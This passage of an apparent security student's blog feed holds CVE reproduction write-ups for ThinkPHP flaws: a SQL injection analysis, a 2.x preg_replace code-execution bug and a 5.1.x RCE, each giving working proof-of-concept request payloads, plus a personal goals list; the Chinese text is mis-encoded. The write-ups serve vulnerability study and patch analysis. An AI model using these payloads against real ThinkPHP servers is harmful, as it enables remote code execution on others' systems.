($this-&gt;query-&gt;isBind($bindName . &#39;_in_&#39; . $k)) {                            $bindKey = $bindName . &#39;_in_&#39; . uniqid() . &#39;_&#39; . $k;                        } else {                            $bindKey = $bindName . &#39;_in_&#39; . $k;                        }                        $bind[$bindKey] = [$v, $bindType];                        $array[]        = &#39;:&#39; . $bindKey;                    }                    $this-&gt;query-&gt;bind($bind);                    $zone = implode(&#39;,&#39;, $array);                } else {                    $zone = implode(&#39;,&#39;, $this-&gt;parseValue($value, $field));                }                $whereStr .= $key . &#39; &#39; . $exp . &#39; (&#39; . (empty($zone) ? &quot;&#39;&#39;&quot; : $zone) . &#39;)&#39;;            }        }         return $whereStr;    }</code></pre><p>ç„¶åæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å½“<code>in_array($exp, [&#39;NOT IN&#39;, &#39;IN&#39;])</code>æ¡ä»¶æ»¡è¶³æ—¶,å°†ä¼šç›´æ¥å°†æˆ‘ä»¬payloadä¸­çš„é”®å€¼ç›´æ¥æ‹¼æ¥åˆ°sqlè¯­å¥ä¸­</p><pre><code class="php">                foreach ($value as $k =&gt; $v) {                        if ($this-&gt;query-&gt;isBind($bindName . &#39;_in_&#39; . $k)) {                            $bindKey = $bindName . &#39;_in_&#39; . uniqid() . &#39;_&#39; . $k;                        } else {                            $bindKey = $bindName . &#39;_in_&#39; . $k;                        }                        $bind[$bindKey] = [$v, $bindType];                        $array[]        = &#39;:&#39; . $bindKey;                    }</code></pre><p>è€Œ<code>$exp</code>åˆ™ç”±<code>$result = $t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)-&gt;select();</code>ä¸­çš„<code>&#39;in&#39;</code>ç»è¿‡ä¸€ç³»åˆ—æ“ä½œåå¾—åˆ°</p><p>ä½†æ˜¯è¿™é‡Œåªèƒ½è¿›è¡Œæ²¡æœ‰å­æŸ¥è¯¢è¯­å¥çš„sqlæŠ¥é”™æ³¨å…¥</p><p>å¦‚æœæœ‰å­æŸ¥è¯¢è¯­å¥çš„è¯å°±ä¼šæŠ¥<code>SQLSTATE[HY000]: General error: 1105 Only constant XPATH queries are supported</code>çš„é”™è¯¯</p><p>æ‰€ä»¥è¿™ä¸ªsqlæ³¨å…¥æœ‰ç‚¹ä¸è¡Œ,ä½†æ—¶sqlæŠ¥é”™ä¼šæš´éœ²æ•°æ®åº“é…ç½®å´æ˜¯éå¸¸æœ‰ç”¨çš„</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p> <a href="https://zerokeeper.com/vul-analysis/thinkphp-framework-50x-sql-injection-analysis.html" target="_blank" rel="noopener">https://zerokeeper.com/vul-analysis/thinkphp-framework-50x-sql-injection-analysis.html</a> </p><p> <a href="https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html</a> </p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="https://explorersss.github.io/2020/02/01/ThinkPHPæ¡†æ¶5.0.x_SQLæ³¨å…¥åˆ†æ/">https://explorersss.github.io/2020/02/01/ThinkPHPæ¡†æ¶5.0.x_SQLæ³¨å…¥åˆ†æ/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> cveå¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cveå¤ç° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æˆ‘çš„2020</title>
      <link href="/2020/01/31/%E6%88%91%E7%9A%842020/"/>
      <url>/2020/01/31/%E6%88%91%E7%9A%842020/</url>
      
        <content type="html"><![CDATA[<h1 id="æˆ‘çš„2020"><a href="#æˆ‘çš„2020" class="headerlink" title="æˆ‘çš„2020"></a>æˆ‘çš„2020</h1><h2 id="è¿™ä¸ªæ˜¯å•¥"><a href="#è¿™ä¸ªæ˜¯å•¥" class="headerlink" title="è¿™ä¸ªæ˜¯å•¥"></a>è¿™ä¸ªæ˜¯å•¥</h2><p>è¿™æ˜¯ä¸€ä¸ªç›®æ ‡æ¸…å•,æ¥è®°å½•æˆ‘2020å¹´æƒ³è¦å®Œæˆçš„äº‹æƒ….</p><h2 id="å†™è¿™ä¸ªçš„åŸå› "><a href="#å†™è¿™ä¸ªçš„åŸå› " class="headerlink" title="å†™è¿™ä¸ªçš„åŸå› "></a>å†™è¿™ä¸ªçš„åŸå› </h2><p><strong>æˆ‘æƒ³è¦åœ¨å¤§å­¦æ¯•ä¸šå,å¾ˆè‡ªç„¶çš„è®¤ä¸º:æˆ‘çš„å¤§å­¦æ˜¯å……å®çš„,æ˜¯æˆ‘æ¯ä¸€å¤©è®¤è®¤çœŸçœŸçš„èµ°è¿‡å»çš„.æˆ‘å¯ä»¥è‡ªè±ªçš„æ‰¿è®¤è‡ªå·±çš„ä¼˜ç§€</strong></p><p><img src="https://i.loli.net/2020/01/31/7OHm9wbEsVYgfd3.png" alt="image173"></p><p>æˆ‘æƒ³è¦å˜å¾—æ›´åŠ ä¼˜ç§€,æˆ‘æƒ³æ´»å‡ºè‡ªå·±</p><h2 id="å¦‚ä½•æ›´æ–°-æ›´æ–°è§„åˆ™"><a href="#å¦‚ä½•æ›´æ–°-æ›´æ–°è§„åˆ™" class="headerlink" title="å¦‚ä½•æ›´æ–°/æ›´æ–°è§„åˆ™"></a>å¦‚ä½•æ›´æ–°/æ›´æ–°è§„åˆ™</h2><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><ol><li>ç›®æ ‡æ˜¯æ¸…æ™°æ˜ç¡®çš„,é‡åŒ–çš„</li><li>ç›®æ ‡éš¾åº¦è¦é€‚åˆ,ä¸èƒ½å¤ªç®€å•ä¹Ÿä¸èƒ½ä¸å¯å®ç°</li><li>å¦‚æœæ— æ³•ç¡®å®šä»Šå¹´çš„ç›®æ ‡,é‚£å°±ç¡®å®šè¿™ä¸ªæœˆçš„å§</li><li>æ ¹æ®å®é™…æƒ…å†µå¯¹ç›®æ ‡è¿›è¡Œè°ƒæ•´</li><li>ä»è‡ªå·±æ‰€èƒ½æƒ³åˆ°çš„æœ€è¿œçš„åœ°æ–¹(ç›®æ ‡/æ¢¦æƒ³/æƒ³æ³•)å¼€å§‹åˆ¶å®šç›®æ ‡</li></ol><h3 id="è§£é‡Š"><a href="#è§£é‡Š" class="headerlink" title="è§£é‡Š"></a>è§£é‡Š</h3><ol><li>ä¸¾ä¾‹:æˆ‘è¦å¥½å¥½å­¦ä¹ (x); æˆ‘è¦å­¦ä¹ ç¼–ç¨‹æ–¹é¢çš„çŸ¥è¯†,è¾¾åˆ°èƒ½å¤Ÿç‹¬ç«‹ç¼–å†™è‡ªå·±çš„åšå®¢ç³»ç»Ÿ(âˆš)</li><li>å¤ªç®€å•çš„ç›®æ ‡æœ‰å¿…è¦åˆ¶å®šå—,æ— æ³•å®ç°çš„ç›®æ ‡æœ‰å¿…è¦å†™ä¸‹æ¥å—.éš¾åº¦é€‚åˆçš„ç›®æ ‡å¯ä»¥ç»™äºˆè‡ªå·±ä¸€ç§æ­£åé¦ˆ,ä½¿è‡ªå·±æ›´æœ‰ä¿¡å¿ƒå®ç°ç›®æ ‡,å¹¶èƒ½ä»ä¸­è·å–ä¹è¶£</li><li>è¡ŒåŠ¨æ˜¯æœ‰ç›®çš„çš„ï¼Œè€Œä»é«˜åˆ°ä½ï¼Œä»æ•´ä½“åˆ°å±€éƒ¨ï¼Œä¼šè®©ä½ æ¸…æ™°çš„è®¤è¯†åˆ°ä½ ç°åœ¨è¦æ€ä¹ˆåšï¼Œä¸ºä»€ä¹ˆè¦è¿™ä¹ˆåšï¼Œä½ æœªæ¥çš„è·¯åœ¨ä½•æ–¹ä¼šæ›´åŠ æ¸…æ™°ï¼Œå¦‚æœæŸä¸ªåœ°æ–¹ä½ æƒ³ä¸å‡ºæ¥ï¼Œé‚£å°±ç¼©å°èŒƒå›´ï¼Œä½ æ— æ³•è€ƒè™‘ä½ äººç”Ÿçš„ç›®çš„ï¼Œä½†ä½ å¯ä»¥æ€è€ƒæœªæ¥10å¹´çš„æ–¹å‘ï¼Œå¯èƒ½æœªæ¥åå¹´ä¹Ÿå¤ªéš¾ä¸‹å®šè®ºï¼Œæœªæ¥ä¸€å¹´ï¼Œä¸€ä¸ªæœˆï¼Œä¸€æ˜ŸæœŸå´æ˜¯å¯ä»¥çš„ã€‚ </li><li>å› ä¸ºå‘¨å›´çš„å˜åŒ–,å¯¹ç›®æ ‡çš„ä¸äº†è§£ç­‰ç­‰å› ç´ å¯¼è‡´å¯èƒ½ä¼šåˆ¶å®šè¿‡éš¾/è¿‡æ˜“/æ²¡æœ‰æ„ä¹‰çš„ç›®æ ‡,æ‰€ä»¥è¦æ ¹æ®å®é™…æƒ…å†µè¿›è¡Œè°ƒæ•´(ä¸æ˜¯å«æˆ‘å·æ‡’å“¦)</li><li>å°ç›®æ ‡æ°¸è¿œæ˜¯ä¸ºå¤§ç›®æ ‡/æ¢¦æƒ³/æƒ³æ³•æœåŠ¡çš„</li></ol><h2 id="å°†ç›®æ ‡è½¬ä¸ºè®¡åˆ’çš„è§„åˆ™"><a href="#å°†ç›®æ ‡è½¬ä¸ºè®¡åˆ’çš„è§„åˆ™" class="headerlink" title="å°†ç›®æ ‡è½¬ä¸ºè®¡åˆ’çš„è§„åˆ™"></a>å°†ç›®æ ‡è½¬ä¸ºè®¡åˆ’çš„è§„åˆ™</h2><ol><li>åˆ†è§£ç»†è‡´ï¼Œèƒ½åŠ›å¯è¾¾ï¼Œç•™æœ‰ä½™åœ°</li><li>å¥–æƒ©å¹¶è¡Œ</li><li>æ¯ä¸ªæ˜ŸæœŸæ€»ç»“ä¸€æ¬¡,è®¡åˆ’æ˜¯å¦åˆç†</li></ol><h2 id="æ‰€èƒ½æƒ³åˆ°çš„æœ€è¿œçš„ç›®æ ‡-æƒ³æ³•-æ¢¦æƒ³"><a href="#æ‰€èƒ½æƒ³åˆ°çš„æœ€è¿œçš„ç›®æ ‡-æƒ³æ³•-æ¢¦æƒ³" class="headerlink" title="æ‰€èƒ½æƒ³åˆ°çš„æœ€è¿œçš„ç›®æ ‡/æƒ³æ³•/æ¢¦æƒ³"></a>æ‰€èƒ½æƒ³åˆ°çš„æœ€è¿œçš„ç›®æ ‡/æƒ³æ³•/æ¢¦æƒ³</h2><ol><li>åœ¨è‡ªå·±çƒ­çˆ±çš„äº‹ä¸šä¸Šè·å¾—å¯è§‚çš„æ”¶å…¥</li><li>èº«ä½“å¥åº·,ä¸‰è§‚å°šåœ¨ </li><li>å¼€å‘ä¸€ä¸ªç±»ä¼¼hexoçš„pythonç¨‹åº</li></ol><h2 id="å…·ä½“å†…å®¹"><a href="#å…·ä½“å†…å®¹" class="headerlink" title="å…·ä½“å†…å®¹"></a>å…·ä½“å†…å®¹</h2><p>å¯’å‡æœŸé—´å»¶è¿Ÿåˆ°2.22(ä¸æ”¹æˆ‘å®Œæˆä¸äº†æ‹‰)</p><ul><li><input checked="" disabled="" type="checkbox"> å¯’å‡æœŸé—´è¡¥å¤©æŒ–æ´è·å¾—18ä¸ªåº“å¸(ä¹°è¿™ä¸ª <a href="https://www.butian.net/Shop/detail/?id=700399" target="_blank" rel="noopener">https://www.butian.net/Shop/detail/?id=700399</a> )</li><li><input disabled="" type="checkbox"> å¯’å‡æœŸé—´å¤ç°30ä¸ªcve(11/30)</li><li><input disabled="" type="checkbox"> å¯’å‡æœŸé—´ä»£ç å®¡è®¡ä¸€ä¸ªå°cms,æ‰¾å‡ºå°½å¯èƒ½å¤šçš„æ¼æ´</li><li><input disabled="" type="checkbox"> å¯’å‡çœ‹å®Œç å†œç¿»èº«(1/3)</li></ul><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="https://explorersss.github.io/2020/01/31/æˆ‘çš„2020/">https://explorersss.github.io/2020/01/31/æˆ‘çš„2020/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> æ‚ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è®°å½• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP 2.xä»»æ„ä»£ç æ‰§è¡Œæ¼æ´</title>
      <link href="/2020/01/30/ThinkPHP%202.x%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/01/30/ThinkPHP%202.x%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="ThinkPHP-2-xä»»æ„ä»£ç æ‰§è¡Œæ¼æ´"><a href="#ThinkPHP-2-xä»»æ„ä»£ç æ‰§è¡Œæ¼æ´" class="headerlink" title="ThinkPHP 2.xä»»æ„ä»£ç æ‰§è¡Œæ¼æ´"></a>ThinkPHP 2.xä»»æ„ä»£ç æ‰§è¡Œæ¼æ´</h1><h2 id="å½±å“èŒƒå›´"><a href="#å½±å“èŒƒå›´" class="headerlink" title="å½±å“èŒƒå›´"></a>å½±å“èŒƒå›´</h2><p>thinkphp 2.1</p><p>å®˜ç½‘çš„thinkphp 2.2å·²ç»ä¿®å¤äº†</p><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>æ¼æ´ä½ç½®</p><p><img src="https://i.loli.net/2020/01/30/8UW5mxvARaoFlPX.png" alt="image154"></p><p>è·¯ç”±è§£æå¤„</p><p><code>$res = preg_replace(&#39;@(\w+)&#39;.$depr.&#39;([^&#39;.$depr.&#39;\/]+)@e&#39;, &#39;$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;&#39;, implode($depr,$paths));</code></p><p>è¿™ä¸ªpreg_replaceæœ‰ç‚¹å¤æ€ª,æ²¡æœ‰ç”¨<code>/</code>æ¥åŒ…å›´æœç´¢æ¨¡å¼è€Œæ˜¯ç”¨<code>@</code>,æŸ¥æ‰¾å…³äºpregçš„æ–‡æ¡£å‘ç°</p><blockquote><p>å½“ä½¿ç”¨ PCRE å‡½æ•°çš„æ—¶å€™ï¼Œæ¨¡å¼éœ€è¦ç”±<em>åˆ†éš”ç¬¦</em>é—­åˆåŒ…è£¹ã€‚åˆ†éš”ç¬¦å¯ä»¥ä½¿ä»»æ„éå­—æ¯æ•°å­—ã€éåæ–œçº¿ã€éç©ºç™½å­—ç¬¦ã€‚   </p><p> ç»å¸¸ä½¿ç”¨çš„åˆ†éš”ç¬¦æ˜¯æ­£æ–œçº¿(<em>/</em>)ã€hashç¬¦å·(<em>#</em>)   ä»¥åŠå–åç¬¦å·(<em>~</em>)ã€‚ä¸‹é¢çš„ä¾‹å­éƒ½æ˜¯ä½¿ç”¨åˆæ³•åˆ†éš”ç¬¦çš„æ¨¡å¼ã€‚    </p><pre><code>/foo bar/#^[^0-9]$#+php+%[a-zA-Z0-9_-]%</code></pre></blockquote><p>æ›¿æ¢å¸¸é‡,è¿™ä¸ªå°±å˜æˆäº†</p><p><code>preg_replace(&#39;@(\w+)/([^\/\/]+)@e&#39;, &#39;$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;&#39;, implode(&#39;/&#39;,$paths));</code></p><p>æŸ¥çœ‹preg_replaceçš„ä»‹ç»å‘ç°</p><blockquote><p>å½“ä½¿ç”¨è¢«å¼ƒç”¨çš„ e ä¿®é¥°ç¬¦æ—¶, è¿™ä¸ªå‡½æ•°ä¼šè½¬ä¹‰ä¸€äº›å­—ç¬¦(å³ï¼šâ€™ã€â€ã€ \ å’Œ NULL) ç„¶åè¿›è¡Œåå‘å¼•ç”¨æ›¿æ¢ã€‚å½“è¿™äº›å®Œæˆåè¯·ç¡®ä¿åå‘å¼•ç”¨è§£æå®Œåæ²¡æœ‰å•å¼•å·æˆ–åŒå¼•å·å¼•èµ·çš„è¯­æ³•é”™è¯¯(æ¯”å¦‚ï¼š â€˜strlen(&#39;$1&#39;)+strlen(â€œ$2â€)â€™)ã€‚ç¡®ä¿ç¬¦åˆPHPçš„ å­—ç¬¦ä¸²è¯­æ³•ï¼Œå¹¶ä¸”ç¬¦åˆevalè¯­æ³•ã€‚å› ä¸ºåœ¨å®Œæˆæ›¿æ¢åï¼Œå¼•æ“ä¼šå°†ç»“æœå­—ç¬¦ä¸²ä½œä¸ºphpä»£ç ä½¿ç”¨evalæ–¹å¼è¿›è¡Œè¯„ä¼°å¹¶å°†è¿”å›å€¼ä½œä¸ºæœ€ç»ˆå‚ä¸æ›¿æ¢çš„å­—ç¬¦ä¸²ã€‚ </p></blockquote><p>æ‰§è¡Œ<code>$replacement</code>(ç¬¬äºŒä¸ªå‚æ•°)å‰,ä¼šå…ˆæ›¿æ¢æ‰å¼•ç”¨</p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°,<code>$replacement</code>ç”¨åŒå¼•å·æ¥åŒ…å›´å¼•ç”¨<code>\\2</code>,ä¼šå¯¼è‡´å‘½ä»¤æ‰§è¡Œ</p><p>æ„é€ </p><pre><code class="php">$paths=array(    &#39;xxxx&#39;,    &#39;${phpinfo()}&#39;);</code></pre><p>åˆ™<code>&#39;$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;&#39;</code>å˜ä¸º<code>$var[&#39;xxxx&#39;]=&quot;${phpinfo()}&quot;;</code></p><p>ä»è€Œå¯¼è‡´å‘½ä»¤æ‰§è¡Œ</p><p>äºæ˜¯æ„é€ payload</p><p><code>[http://127.0.0.1/public/index.php?s=/index/index/name/$%7B@phpinfo()%7D](http://127.0.0.1/public/index.php?s=/index/index/name/${@phpinfo()})</code></p><h2 id="è¡¥ä¸åˆ†æ"><a href="#è¡¥ä¸åˆ†æ" class="headerlink" title="è¡¥ä¸åˆ†æ"></a>è¡¥ä¸åˆ†æ</h2><p><img src="https://i.loli.net/2020/01/30/9AlHbyKzaBOJXnR.png" alt="image1293"></p><p>ç”¨å•å¼•å·æ¥åŒ…å›´æ‰€æœ‰å¼•ç”¨å°±å¯ä»¥é¿å…å‘½ä»¤æ‰§è¡Œ</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p> <a href="https://github.com/vulhub/vulhub/tree/master/thinkphp/2-rce" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/thinkphp/2-rce</a> </p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š [<a href="https://explorersss.github.io/2020/01/30/ThinkPHP">https://explorersss.github.io/2020/01/30/ThinkPHP</a> 2.xä»»æ„ä»£ç æ‰§è¡Œæ¼æ´/](<a href="https://explorersss.github.io/2020/01/30/ThinkPHP">https://explorersss.github.io/2020/01/30/ThinkPHP</a> 2.xä»»æ„ä»£ç æ‰§è¡Œæ¼æ´/) <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> cveå¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cveå¤ç° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP 5.1.x-5.2.xå…¨ç‰ˆæœ¬RCE æ¼æ´åˆ†æ</title>
      <link href="/2020/01/30/ThinkPHP%205.1.x-5.2.x%E5%85%A8%E7%89%88%E6%9C%ACRCE%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2020/01/30/ThinkPHP%205.1.x-5.2.x%E5%85%A8%E7%89%88%E6%9C%ACRCE%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="ThinkPHP-5-1-x-5-2-xå…¨ç‰ˆæœ¬RCE-æ¼æ´åˆ†æ"><a href="#ThinkPHP-5-1-x-5-2-xå…¨ç‰ˆæœ¬RCE-æ¼æ´åˆ†æ" class="headerlink" title="ThinkPHP 5.1.x-5.2.xå…¨ç‰ˆæœ¬RCE æ¼æ´åˆ†æ"></a>ThinkPHP 5.1.x-5.2.xå…¨ç‰ˆæœ¬RCE æ¼æ´åˆ†æ</h1><h2 id="å½±å“èŒƒå›´"><a href="#å½±å“èŒƒå›´" class="headerlink" title="å½±å“èŒƒå›´"></a>å½±å“èŒƒå›´</h2><p>5.1.x-5.1.32  5.2.x(è¿™ä¸ªè¿˜æ²¡å»çœ‹)</p><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>è¡¥ä¸: <a href="https://github.com/top-think/framework/commit/2454cebcdb6c12b352ac0acd4a4e6b25b31982e6" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/2454cebcdb6c12b352ac0acd4a4e6b25b31982e6</a> </p><p>æµ‹è¯•ç¯å¢ƒ 5.1.29</p><p><strong>å…¥å£å¤„å…³é—­æŠ¥é”™</strong> </p><p><img src="https://i.loli.net/2020/01/30/2x4QWZYgmXjqo8r.png" alt="image283"></p><p>å’Œ5.0.xç‰ˆæœ¬çš„æ¼æ´æœ‰ç€ç›¸ä¼¼ä¹‹å¤„,éƒ½æ˜¯<code>$this-&gt;method</code>æ–¹æ³•æœªè¿‡æ»¤å¯¼è‡´çš„ä»»æ„å˜é‡è¦†ç›–,ä»è€Œå¯¼è‡´å‘½ä»¤æ‰§è¡Œ</p><p>é€šè¿‡<code>$_POST[&#39;_method&#39;]=xxxxx</code>æ¥è¿›è¡Œä»»æ„å˜é‡è¦†ç›–</p><p>æˆ‘ä»¬é€‰æ‹©è¦†ç›–<code>$this-&gt;filter</code>,ç¿»æ‰¾Requestç±»ä¸­çš„å‡½æ•°å‘ç°è¿˜æ˜¯<code>Request::input</code>å¤„å¯ä»¥å‘½ä»¤æ‰§è¡Œ,ä¸‹æ–­ç‚¹å¯ä»¥çœ‹åˆ°è°ƒç”¨å †æ ˆ</p><p><img src="https://i.loli.net/2020/01/30/dVyPeZHbYM3TFq7.png" alt="image527"></p><p>æˆ‘ä»¬ä»<code>Request::param</code>å¤„å¼€å§‹åˆ†æ</p><pre><code class="php">public function param($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)    {        if (!$this-&gt;mergeParam) {            $method = $this-&gt;method(true);            // è‡ªåŠ¨è·å–è¯·æ±‚å˜é‡            switch ($method) {                case &#39;POST&#39;:                    $vars = $this-&gt;post(false);                    break;                case &#39;PUT&#39;:                case &#39;DELETE&#39;:                case &#39;PATCH&#39;:                    $vars = $this-&gt;put(false);                    break;                default:                    $vars = [];            }            // å½“å‰è¯·æ±‚å‚æ•°å’ŒURLåœ°å€ä¸­çš„å‚æ•°åˆå¹¶            $this-&gt;param = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));            $this-&gt;mergeParam = true;        }        ...    }</code></pre><p>å› ä¸ºæ˜¯POSTè¯·æ±‚æ‰€ä»¥ä¼šè¿›å…¥POSTåˆ†æ”¯,è·Ÿè¿›<code>Request::post</code></p><pre><code class="php">    public function post($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)    {        if (empty($this-&gt;post)) {            $this-&gt;post = !empty($_POST) ? $_POST : $this-&gt;getInputData($this-&gt;input);        }        return $this-&gt;input($this-&gt;post, $name, $default, $filter);    }</code></pre><p>æ¥ç€ä¾¿ä¼šè°ƒç”¨<code>Request::input</code>,å…¶ä¸­<code>$this-&gt;post</code>å’Œ<code>$filter</code>å¯æ§</p><p>è·Ÿè¿›<code>Request::input</code></p><pre><code class="php">public function input($data = [], $name = &#39;&#39;, $default = null, $filter = &#39;&#39;)    {        ...        // è§£æè¿‡æ»¤å™¨        $filter = $this-&gt;getFilter($filter, $default);        if (is_array($data)) {            array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);            reset($data);        } else {            $this-&gt;filterValue($data, $name, $filter);        }       ...    }</code></pre><p>å› ä¸º<code>$data</code>æ˜¯æ•°ç»„(<code>$_POST</code>),è°ƒç”¨<code>array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);</code></p><p>å¯¹<code>$data</code>ä¸­æ‰€æœ‰å€¼è°ƒç”¨<code>Request::filterValue</code></p><p>è·Ÿè¿›å»</p><pre><code class="php">private function filterValue(&amp;$value, $key, $filters)    {        $default = array_pop($filters);        foreach ($filters as $filter) {            if (is_callable($filter)) {                // è°ƒç”¨å‡½æ•°æˆ–è€…æ–¹æ³•è¿‡æ»¤                $value = call_user_func($filter, $value);            } elseif (is_scalar($value)) {                if (false !== strpos($filter, &#39;/&#39;)) {                    // æ­£åˆ™è¿‡æ»¤                    if (!preg_match($filter, $value)) {                        // åŒ¹é…ä¸æˆåŠŸè¿”å›é»˜è®¤å€¼                        $value = $default;                        break;                    }                } elseif (!empty($filter)) {                    // filterå‡½æ•°ä¸å­˜åœ¨æ—¶, åˆ™ä½¿ç”¨filter_varè¿›è¡Œè¿‡æ»¤                    // filterä¸ºéæ•´å½¢å€¼æ—¶, è°ƒç”¨filter_idå–å¾—è¿‡æ»¤id                    $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter));                    if (false === $value) {                        $value = $default;                        break;                    }                }            }        }        return $value;    }</code></pre><p>é˜…è¯»ä»£ç å¯çŸ¥,filterValueä¼šå¯¹<code>$_POST</code>ä¸­æ‰€æœ‰å€¼è°ƒç”¨<code>$filter</code>ä¸­æ¯ä¸€ä¸ªå¯ä»¥è°ƒç”¨çš„å‡½æ•°æˆ–æ–¹æ³•</p><p>ä¸”<code>$filter</code>=<code>$_POST</code></p><p>å› æ­¤æœ‰</p><pre><code>http://127.0.0.1/public/POST:  var1=exec&amp;var2=calc.exe&amp;_method=filter</code></pre><h2 id="è¡¥ä¸åˆ†æ"><a href="#è¡¥ä¸åˆ†æ" class="headerlink" title="è¡¥ä¸åˆ†æ"></a>è¡¥ä¸åˆ†æ</h2><p>å¯¹methodè¿›è¡Œäº†ç™½åå•é™åˆ¶</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p> <a href="https://www.smi1e.top/thinkphp-5-1-x5-2-xå…¨ç‰ˆæœ¬-rce-æ¼æ´åˆ†æ/" target="_blank" rel="noopener">https://www.smi1e.top/thinkphp-5-1-x5-2-xå…¨ç‰ˆæœ¬-rce-æ¼æ´åˆ†æ/</a> </p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š [<a href="https://explorersss.github.io/2020/01/30/ThinkPHP">https://explorersss.github.io/2020/01/30/ThinkPHP</a> 5.1.x-5.2.xå…¨ç‰ˆæœ¬RCE æ¼æ´åˆ†æ/](<a href="https://explorersss.github.io/2020/01/30/ThinkPHP">https://explorersss.github.io/2020/01/30/ThinkPHP</a> 5.1.x-5.2.xå…¨ç‰ˆæœ¬RCE æ¼æ´åˆ†æ/) <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> cveå¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cveå¤ç° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP 5.0.0~5.0.23 RCE æ¼æ´å¤ç°</title>
      <link href="/2020/01/30/ThinkPHP%205.0.0~5.0.23%20RCE%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2020/01/30/ThinkPHP%205.0.0~5.0.23%20RCE%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
